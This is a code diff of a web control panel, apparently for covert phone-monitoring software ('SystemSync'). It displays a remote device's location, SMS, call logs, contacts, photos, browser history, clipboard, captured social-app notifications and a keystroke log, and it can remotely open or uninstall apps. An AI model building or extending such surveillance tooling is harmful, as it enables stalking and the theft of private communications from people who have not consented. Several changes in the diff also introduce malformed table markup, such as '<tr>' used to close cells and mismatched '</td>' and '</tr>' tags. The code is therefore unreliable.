                 }
+
                 const docs = [];
-                snapshot.forEach(doc => docs.push({ id: doc.id, ...doc.data() }));
+                snapshot.forEach(doc => {
+                    docs.push({ id: doc.id, ...doc.data() });
+                });
                 docs.sort((a, b) => (b.dateAdded || 0) - (a.dateAdded || 0));
+
                 let html = '<h3>🖼️ Photo Gallery (Firebase)</h3><div class="photo-grid" id="photoGrid"></div>';
                 panel.innerHTML = html;
                 const grid = document.getElementById('photoGrid');
@@ -2027,29 +2111,78 @@
                     const tile = document.createElement('div');
                     tile.className = 'photo-tile';
                     if (thumbBase64) {
-                        tile.innerHTML = `<img src="${thumbBase64}" loading="lazy"><div class="photo-overlay">${escapeHtml(timestamp)}</div>`;
+                        tile.innerHTML = `
+                    <img src="${thumbBase64}" loading="lazy">
+                    <div class="photo-overlay">${escapeHtml(timestamp)}</div>
+                `;
                     } else {
-                        tile.innerHTML = `<div style="display:flex; align-items:center; justify-content:center; height:100%; background:#f0f0f0;">📷</div><div class="photo-overlay">${escapeHtml(timestamp)}</div>`;
+                        tile.innerHTML = `
+                    <div style="display:flex; align-items:center; justify-content:center; height:100%; background:#f0f0f0;">📷</div>
+                    <div class="photo-overlay">${escapeHtml(timestamp)}</div>
+                `;
                     }
                     tile.addEventListener('click', () => {
-                        if (photo.mediaId) { sendCommand('GET_IMAGE', { mediaId: photo.mediaId, maxDim: 1200 }); showNotification('Requesting full image from device...'); }
-                        else showNotification('No image data available');
+                        if (photo.mediaId) {
+                            sendCommand('GET_IMAGE', { mediaId: photo.mediaId, maxDim: 1200 });
+                            showNotification('Requesting full image from device...');
+                        } else {
+                            showNotification('No image data available');
+                        }
                     });
                     grid.appendChild(tile);
                 });
             } catch (err) {
                 console.error(err);
-                panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackGalleryBtn2" class="btn-ui primary">Fetch from Device</button>`;
-                document.getElementById('fallbackGalleryBtn2')?.addEventListener('click', () => { sendCommand('GET_RECENT_IMAGES', { days: 5 }); showNotification('Fetching recent images from device...'); });
+                if (err.code === 'permission-denied') {
+                    panel.innerHTML = `
+                <h3>🖼️ Photo Gallery</h3>
+                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
+                    <strong>⚠️ Firebase Permission Error</strong><br>
+                    Your security rules are blocking access to the <code>images_meta</code> collection.<br><br>
+                    <button id="retryGalleryBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
+                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
+                </div>
+            `;
+                    document.getElementById('retryGalleryBtn')?.addEventListener('click', () => showPhotoGalleryPanel());
+                    document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
+                } else {
+                    panel.innerHTML = `<h3>🖼️ Photo Gallery</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackGalleryBtn2" class="btn-ui primary">Fetch from Device</button>`;
+                    document.getElementById('fallbackGalleryBtn2')?.addEventListener('click', () => {
+                        sendCommand('GET_RECENT_IMAGES', { days: 5 });
+                        showNotification('Fetching recent images from device...');
+                    });
+                }
             }
         }
 
         // ==================== SCREEN TIME ====================
         async function showAppUsagePanel() {
-            if (!selectedDeviceId) { panel.innerHTML = '<p>No device selected.</p>'; return; }
-            if (!currentUser) { panel.innerHTML = '<p>You must be logged in.</p>'; return; }
-            panel.innerHTML = `<h3>📊 Screen Time (from Firebase)</h3><div class="date-selector"><button class="btn-ui primary" data-days="1">Today</button><button class="btn-ui primary" data-days="7">Last 7 Days</button><button class="btn-ui primary" data-days="30">Last 30 Days</button></div><div id="screenTimeData"></div>`;
-            panel.querySelectorAll('button[data-days]').forEach(btn => btn.addEventListener('click', () => loadAppUsageFromFirebase(parseInt(btn.dataset.days))));
+            if (!selectedDeviceId) {
+                panel.innerHTML = '<p>No device selected.</p>';
+                return;
+            }
+            if (!currentUser) {
+                panel.innerHTML = '<p>You must be logged in.</p>';
+                return;
+            }
+            panel.innerHTML = `
+        <h3>📊 Screen Time (from Firebase)</h3>
+        <div class="date-selector">
+            <button class="btn-ui primary" data-days="1">Today</button>
+            <button class="btn-ui primary" data-days="7">Last 7 Days</button>
+            <button class="btn-ui primary" data-days="30">Last 30 Days</button>
+        </div>
+        <div id="screenTimeData"></div>
+    `;
+            panel.querySelectorAll('button[data-days]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const days = parseInt(btn.dataset.days);
+                    loadAppUsageFromFirebase(days);
+                });
+            });
             loadAppUsageFromFirebase(1);
         }
 
@@ -2060,8 +2193,14 @@
             try {
                 const now = new Date();
                 const cutoff = new Date(now.getTime() - days * 86400000);
-                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage').where('timestamp', '>=', cutoff).orderBy('timestamp', 'desc').get();
-                if (snapshot.empty) { container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>'; return; }
+                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
+                    .where('timestamp', '>=', cutoff)
+                    .orderBy('timestamp', 'desc')
+                    .get();
+                if (snapshot.empty) {
+                    container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
+                    return;
+                }
                 const appTotals = new Map();
                 snapshot.forEach(doc => {
                     const data = doc.data();
@@ -2070,30 +2209,46 @@
                         apps.forEach(app => {
                             const name = app.appName || app.packageName || 'Unknown';
                             const timeMs = app.totalTimeMs || 0;
-                            if (appTotals.has(name)) appTotals.set(name, appTotals.get(name) + timeMs);
-                            else appTotals.set(name, timeMs);
+                            if (appTotals.has(name)) {
+                                appTotals.set(name, appTotals.get(name) + timeMs);
+                            } else {
+                                appTotals.set(name, timeMs);
+                            }
                         });
                     }
                 });
-                if (appTotals.size === 0) { container.innerHTML = '<p>No usage data for the selected period.</p>'; return; }
+                if (appTotals.size === 0) {
+                    container.innerHTML = '<p>No usage data for the selected period.</p>';
+                    return;
+                }
                 const sorted = Array.from(appTotals.entries()).sort((a, b) => b[1] - a[1]);
                 const max = sorted[0][1];
                 let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
                 for (let [name, timeMs] of sorted) {
                     const pct = max ? Math.round((timeMs / max) * 100) : 0;
                     const color = getColorForDuration(timeMs);
-                    html += `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(name)}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${color};"></div></div><div class="app-usage-time">${formatDuration(timeMs)}</div></div>`;
+                    html += `
+                <div class="app-usage-item">
+                    <div class="app-usage-name">${escapeHtml(name)}</div>
+                    <div class="usage-bar-container">
+                        <div class="usage-bar" style="width:${pct}%; background-color:${color};"></div>
+                    </div>
+                    <div class="app-usage-time">${formatDuration(timeMs)}</div>
+                </div>
+            `;
                 }
                 html += '</div>';
                 container.innerHTML = html;
-            } catch (err) { console.error(err); container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>'; }
+            } catch (err) {
+                console.error(err);
+                container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>';
+            }
         }
 
         // ==================== ENHANCED MAP ====================
-        // Render the live tracking map (with follow option)
-function renderLiveMap(lat, lon, acc) {
-    if (!liveMap) {
-        panel.innerHTML = `
+        function renderLiveMap(lat, lon, acc) {
+            if (!liveMap) {
+                panel.innerHTML = `
             <div style="position:relative;">
                 <div id="liveMapContainer" style="height:400px; border-radius:12px;"></div>
                 <div class="map-info" id="liveMapInfo">
@@ -2108,102 +2263,114 @@ function renderLiveMap(lat, lon, acc) {
                 </label>
             </div>
         `;
-        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap' });
-        const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: 'Tiles &copy; Esri' });
-        liveMap = L.map('liveMapContainer').setView([lat, lon], 18);
-        streetLayer.addTo(liveMap);
-        liveMap.currentTileLayer = streetLayer;
-        liveMap.satelliteLayer = satelliteLayer;
-        liveMap.streetLayer = streetLayer;
-        liveMarker = L.marker([lat, lon], { icon: L.divIcon({ className: 'current-location-marker', iconSize: [12, 12] }) }).addTo(liveMap).bindPopup('Device Location');
-        liveCircle = L.circle([lat, lon], { radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2 }).addTo(liveMap);
-        
-        document.getElementById('liveMapTypeToggle').addEventListener('click', () => {
-            if (currentMapType === 'street') {
-                liveMap.removeLayer(liveMap.currentTileLayer);
-                liveMap.satelliteLayer.addTo(liveMap);
-                liveMap.currentTileLayer = liveMap.satelliteLayer;
-                currentMapType = 'satellite';
-                document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Street';
-            } else {
-                liveMap.removeLayer(liveMap.currentTileLayer);
-                liveMap.streetLayer.addTo(liveMap);
-                liveMap.currentTileLayer = liveMap.streetLayer;
-                currentMapType = 'street';
-                document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
-            }
-        });
-        
-        document.getElementById('followLocationCheck').addEventListener('change', e => followLocation = e.target.checked);
-        
-        // Reverse geocode
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
-            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
-        })
-        .then(r => r.json())
-        .then(d => document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(d.display_name || 'Address not found')}`)
-        .catch(() => document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable');
-    } else {
-        liveMarker.setLatLng([lat, lon]);
-        liveCircle.setLatLng([lat, lon]);
-        liveCircle.setRadius(acc);
-        document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-        document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
-            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
-        })
-        .then(r => r.json())
-        .then(d => document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(d.display_name || 'Address not found')}`)
-        .catch(() => document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable');
-        if (followLocation) liveMap.setView([lat, lon]);
-    }
-}
-
-// Show static location map (for single GET_LOCATION)
-function renderMap(data) {
-    const loc = data && data.latitude ? { lat: data.latitude, lon: data.longitude, acc: data.accuracy || 10 } : (data && data.lat ? data : null);
-    if (!loc) return;
-    currentLocation = loc;
-    panel.innerHTML = `
-        <h3>📍 Device Location</h3>
-        <div id="gpsMap" style="height:450px; border-radius:12px; border:1px solid var(--border);"></div>
-        <div class="map-info" style="position:relative; top:12px; left:0; max-width:100%; box-shadow:none; border:1px solid var(--border);">
-            <div><strong>📍 GPS Fix</strong></div>
-            <div>Coordinates: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
-            <div>Accuracy: ${loc.acc.toFixed(1)}m</div>
-        </div>
-    `;
-    setTimeout(() => {
-        const map = L.map('gpsMap').setView([loc.lat, loc.lon], 16);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        L.marker([loc.lat, loc.lon]).addTo(map).bindPopup('Last Known Location').openPopup();
-        L.circle([loc.lat, loc.lon], { radius: loc.acc, color: '#0f62fe', fillColor: '#0f62fe', fillOpacity: 0.15 }).addTo(map);
-    }, 100);
-}
-
-        // ==================== DATA DISPLAY FUNCTIONS (FIXED) ====================
-        function renderTable(rows, headers, sortIndex = -1, descending = true) {
-            if (!rows || rows.length === 0) { panel.innerHTML = '<p style="color:#999; padding:20px;">No data available</p>'; return; }
-            if (sortIndex >= 0) {
-                rows.sort((a, b) => {
-                    let valA = a[sortIndex] || '', valB = b[sortIndex] || '';
-                    const numA = Number(valA), numB = Number(valB);
-                    if (!isNaN(numA) && !isNaN(numB)) return descending ? numB - numA : numA - numB;
-                    return descending ? String(valB).localeCompare(String(valA)) : String(valA).localeCompare(String(valB));
+                const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; OpenStreetMap contributors'
                 });
+                const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+                    attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+                });
+                liveMap = L.map('liveMapContainer').setView([lat, lon], 18);
+                streetLayer.addTo(liveMap);
+                liveMap.currentTileLayer = streetLayer;
+                liveMap.satelliteLayer = satelliteLayer;
+                liveMap.streetLayer = streetLayer;
+                liveMarker = L.marker([lat, lon], { icon: L.divIcon({ className: 'current-location-marker', iconSize: [12, 12] }) }).addTo(liveMap).bindPopup('Device Location');
+                liveCircle = L.circle([lat, lon], { radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2 }).addTo(liveMap);
+                document.getElementById('liveMapTypeToggle').addEventListener('click', () => {
+                    if (currentMapType === 'street') {
+                        liveMap.removeLayer(liveMap.currentTileLayer);
+                        liveMap.satelliteLayer.addTo(liveMap);
+                        liveMap.currentTileLayer = liveMap.satelliteLayer;
+                        currentMapType = 'satellite';
+                        document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Street';
+                    } else {
+                        liveMap.removeLayer(liveMap.currentTileLayer);
+                        liveMap.streetLayer.addTo(liveMap);
+                        liveMap.currentTileLayer = liveMap.streetLayer;
+                        currentMapType = 'street';
+                        document.getElementById('liveMapTypeToggle').innerHTML = '🗺️ Switch to Satellite';
+                    }
+                });
+                document.getElementById('followLocationCheck').addEventListener('change', (e) => {
+                    followLocation = e.target.checked;
+                });
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const address = data.display_name || 'Address not found';
+                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+                    })
+                    .catch(err => {
+                        console.error('Geocoding error:', err);
+                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+                    });
+            } else {
+                liveMarker.setLatLng([lat, lon]);
+                liveCircle.setLatLng([lat, lon]);
+                liveCircle.setRadius(acc);
+                document.getElementById('liveCoord').innerHTML = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+                document.getElementById('liveAccuracy').innerHTML = `🎯 Accuracy: ${acc.toFixed(1)} m`;
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                    headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const address = data.display_name || 'Address not found';
+                        document.getElementById('liveAddress').innerHTML = `🌍 ${escapeHtml(address)}`;
+                    })
+                    .catch(err => {
+                        console.error('Geocoding error:', err);
+                        document.getElementById('liveAddress').innerHTML = '🌍 Address unavailable';
+                    });
+                if (followLocation) {
+                    liveMap.setView([lat, lon]);
+                }
             }
+        }
+
+        function renderMap(data) {
+            const loc = data && data.latitude ? { lat: data.latitude, lon: data.longitude, acc: data.accuracy || 10 } : (data && data.lat ? data : null);
+            if (!loc) return;
+            currentLocation = loc;
+            panel.innerHTML = `
+                <h3>📍 Device Location</h3>
+                <div id="gpsMap" style="height:450px; border-radius:12px; border:1px solid var(--border);"></div>
+                <div class="map-info" style="position:relative; top:12px; left:0; max-width:100%; box-shadow:none; border:1px solid var(--border);">
+                    <div><strong>📍 GPS Fix</strong></div>
+                    <div>Coordinates: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
+                    <div>Accuracy: ${loc.acc.toFixed(1)}m</div>
+                </div>
+            `;
+            setTimeout(() => {
+                const map = L.map('gpsMap').setView([loc.lat, loc.lon], 16);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.marker([loc.lat, loc.lon]).addTo(map).bindPopup('Last Known Location').openPopup();
+                L.circle([loc.lat, loc.lon], { radius: loc.acc, color: '#0f62fe', fillColor: '#0f62fe', fillOpacity: 0.15 }).addTo(map);
+            }, 100);
+        }
+
+        // ==================== DATA DISPLAY FUNCTIONS ====================
+        function renderTable(rows, headers) {
             const pageSize = 20;
             const totalPages = Math.ceil(rows.length / pageSize);
             const start = currentPage * pageSize;
             const pageRows = rows.slice(start, start + pageSize);
             let html = '<div style="overflow-x:auto;"><table><thead><tr>';
             headers.forEach(h => html += `<th>${h}</th>`);
-            html += '</tr></thead><tbody>';
-            pageRows.forEach(r => { html += '<tr>'; r.forEach(cell => html += `<td>${escapeHtml(String(cell || ''))}</td>`); html += '</tr>'; });
+            html += '</thead><tbody>';
+            pageRows.forEach(r => {
+                html += '<tr>';
+                r.forEach(cell => html += `<td>${escapeHtml(cell || '')}<tr>`);
+                html += '</tr>';
+            });
             html += '</tbody></table></div>';
             if (totalPages > 1) {
                 html += '<div class="pagination">';
-                for (let i = 0; i < totalPages; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i + 1}</button>`;
+                for (let i = 0; i < totalPages; i++) {
+                    html += `<button class="page-btn" onclick="gotoPage(${i})">${i + 1}</button>`;
+                }
                 html += '</div>';
             }
             panel.innerHTML = html;
@@ -2211,85 +2378,102 @@ function renderMap(data) {
 
         window.gotoPage = function (p) {
             currentPage = p;
-            if (dataType === 'sms') renderSmsTable();
-            else if (dataType === 'call') renderCallLogsTable();
-            else if (dataType === 'contacts') renderContactsTable();
-            else if (dataType === 'wifi') renderWifiTable();
-            else if (dataType === 'social') renderSocialTable();
+            if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
+            else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
+            else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
+            else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
         };
 
         function displaySMS(data) {
             let smsArray = data;
-            if (typeof data === 'string') { try { smsArray = JSON.parse(data); } catch (e) { smsArray = []; } }
-            if (!Array.isArray(smsArray) || smsArray.length === 0) { panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>'; return; }
-            smsArray.sort((a, b) => String(b.date || b.timeFmt || '').localeCompare(String(a.date || a.timeFmt || '')));
-            const rows = smsArray.map(m => [m.type === 'inbox' || m.type === 1 ? '📥 Incoming' : '📤 Outgoing', m.address || m.number || '', m.body || '', m.date || m.timeFmt || '']);
-            currentData = rows; dataType = 'sms'; renderSmsTable();
+            if (typeof data === 'string') {
+                try { smsArray = JSON.parse(data); } catch (e) { smsArray = []; }
+            }
+            if (!Array.isArray(smsArray) || smsArray.length === 0) {
+                panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>';
+                return;
+            }
+            const rows = smsArray.map(m => [
+                m.type === 'inbox' || m.type === 1 ? '📥 Incoming' : '📤 Outgoing',
+                m.address || m.number || '',
+                m.body || '',
+                m.date || m.timeFmt || ''
+            ]);
+            currentData = rows;
+            dataType = 'sms';
+            renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
         }
-        function renderSmsTable() { renderTable(currentData, ['Type', 'Number', 'Message', 'Date']); }
 
         function displayCallLogs(data) {
             let callArray = data;
-            if (typeof data === 'string') { try { callArray = JSON.parse(data); } catch (e) { callArray = []; } }
-            if (!Array.isArray(callArray) || callArray.length === 0) { panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>'; return; }
-            callArray.sort((a, b) => String(b.date || b.timeFmt || '').localeCompare(String(a.date || a.timeFmt || '')));
-            const rows = callArray.map(c => [c.type || '', c.number || '', c.name || '', c.date || c.timeFmt || '', formatDurationSeconds(c.duration)]);
-            currentData = rows; dataType = 'call'; renderCallLogsTable();
+            if (typeof data === 'string') {
+                try { callArray = JSON.parse(data); } catch (e) { callArray = []; }
+            }
+            if (!Array.isArray(callArray) || callArray.length === 0) {
+                panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
+                return;
+            }
+            const rows = callArray.map(c => [
+                c.type || '',
+                c.number || '',
+                c.name || '',
+                c.date || c.timeFmt || '',
+                formatDurationSeconds(c.duration)
+            ]);
+            currentData = rows;
+            dataType = 'call';
+            renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
         }
-        function renderCallLogsTable() { renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']); }
 
         function displayContacts(data) {
             let contactArray = data;
-            if (typeof data === 'string') { try { contactArray = JSON.parse(data); } catch (e) { contactArray = []; } }
-            if (!Array.isArray(contactArray) || contactArray.length === 0) { panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-            contactArray.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
-            const rows = contactArray.map(c => [c.name || '', c.number || '', c.timesContacted || 0]);
-            currentData = rows; dataType = 'contacts'; renderContactsTable();
+            if (typeof data === 'string') {
+                try { contactArray = JSON.parse(data); } catch (e) { contactArray = []; }
+            }
+            if (!Array.isArray(contactArray) || contactArray.length === 0) {
+                panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
+                return;
+            }
+            const rows = contactArray.map(c => [
+                c.name || '',
+                c.number || '',
+                c.timesContacted || 0
+            ]);
+            currentData = rows;
+            dataType = 'contacts';
+            renderTable(rows, ['Name', 'Number', 'Times Contacted']);
         }
-        function renderContactsTable() { renderTable(currentData, ['Name', 'Number', 'Times Contacted']); }
 
         function displayWifiNetworks(data) {
-            if (!Array.isArray(data) || data.length === 0) { panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>'; return; }
-            data.sort((a, b) => (b.rssi || -100) - (a.rssi || -100));
-            const rows = data.map(n => { const bars = n.rssi > -50 ? '████' : (n.rssi > -70 ? '███░' : (n.rssi > -80 ? '██░░' : '█░░░')); const status = n.connected ? '● Connected' : '○'; return [n.ssid || '(hidden)', bars, status]; });
-            currentData = rows; dataType = 'wifi'; renderWifiTable();
+            if (!Array.isArray(data) || data.length === 0) {
+                panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
+                return;
+            }
+            const rows = data.map(n => {
+                const bars = n.rssi > -50 ? '████' : (n.rssi > -70 ? '███░' : (n.rssi > -80 ? '██░░' : '█░░░'));
+                const status = n.connected ? '● Connected' : '○';
+                return [n.ssid || '(hidden)', bars, status];
+            });
+            currentData = rows;
+            dataType = 'wifi';
+            renderTable(rows, ['SSID', 'Signal', 'Status']);
         }
-        function renderWifiTable() { renderTable(currentData, ['SSID', 'Signal', 'Status']); }
-
-        function displaySocialMessages(data) {
-            let msgs = typeof data === 'string' ? JSON.parse(data) : data;
-            if (!Array.isArray(msgs) || msgs.length === 0) { panel.innerHTML = '<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
-            msgs.sort((a, b) => String(b.timeFmt || b.date || '').localeCompare(String(a.timeFmt || a.date || '')));
-            const rows = msgs.map(m => { const pkg = m.pkg || m.packageName || ''; const appName = m.app || getAppNameFromPkg(pkg) || pkg; const details = `[${escapeHtml(m.title || '')}] ${escapeHtml(m.text || m.body || '')}`; const dateTime = m.timeFmt || m.date || ''; return [appName, details, dateTime]; });
-            currentData = rows; dataType = 'social'; renderSocialTable();
-        }
-        function renderSocialTable() { renderTable(currentData, ['App/Package', 'Message Details', 'Date & Time']); }
-        function getAppNameFromPkg(pkg) { const map = { 'com.whatsapp': 'WhatsApp', 'org.telegram.messenger': 'Telegram', 'com.instagram.android': 'Instagram', 'com.facebook.orca': 'Messenger', 'com.facebook.katana': 'Facebook', 'com.snapchat.android': 'Snapchat' }; return map[pkg] || pkg; }
 
         function displayInstalledApps(data) {
             if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-            let html = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>`;
-            data.forEach(app => html += `<tr><td>${escapeHtml(app.appName || '')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName || '')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`);
-            html += '</tbody></table></div>';
-            panel.innerHTML = html;
+            panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></td></thead><tbody>${data.map(app => `<tr><td>${escapeHtml(app.appName || '')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName || '')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></tr></div>`;
             document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
             document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
         }
 
         function displayBrowserHistory(data) {
             if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-            let html = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>`;
-            data.forEach(item => html += `<tr><td>${item.date || item.timeFmt || ''}</td><td>${escapeHtml(item.title || '')}</td><td><a href="${escapeHtml(item.url || '#')}" target="_blank">${escapeHtml(item.url || '')}</a></td></tr>`);
-            html += '</tbody></table></div>';
-            panel.innerHTML = html;
+            panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item => `<tr><td>${item.date || item.timeFmt || ''}</td><td>${escapeHtml(item.title || '')}</td><td><a href="${escapeHtml(item.url || '#')}" target="_blank">${escapeHtml(item.url || '')}</a></td></tr>`).join('')}</tbody></table></div>`;
         }
 
         function displayKeylog(data) {
             if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-            let html = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>`;
-            data.slice().reverse().forEach(e => html += `<tr><td>${e.timeFmt || ''}</td><td>${(e.pkg || '').split('.').pop()}</td><td>${escapeHtml(e.text || e.key || '')}</td></tr>`);
-            html += '</tbody></table></div>';
-            panel.innerHTML = html;
+            panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><td><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e => `<tr><td>${e.timeFmt || ''}</td><td>${(e.pkg || '').split('.').pop()}</td><td>${escapeHtml(e.text || e.key || '')}</td></tr>`).join('')}</tbody></table></div>`;
             document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
         }
 
@@ -2298,137 +2482,57 @@ function renderMap(data) {
             panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
         }
 
-        // ==================== LOCATION / GPS ====================
-        // Request a single location update
-        function requestLocation() {
-            sendCommand('GET_LOCATION');
-            panel.innerHTML = '<p>📍 Requesting GPS location...</p>';
+        function displaySocialMessages(data) {
+            let msgs = typeof data === 'string' ? JSON.parse(data) : data;
+            if (!Array.isArray(msgs) || !msgs.length) { panel.innerHTML = '<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
+            panel.innerHTML = `<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">` + msgs.slice().reverse().map(m => `<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app || getAppNameFromPkg(m.pkg) || 'Unknown')}</strong> <small>${m.timeFmt || ''}</small></div><div>${escapeHtml(m.title || '')}</div><div>${escapeHtml(m.text || m.body || '')}</div></div>`).join('') + `</div>`;
         }
 
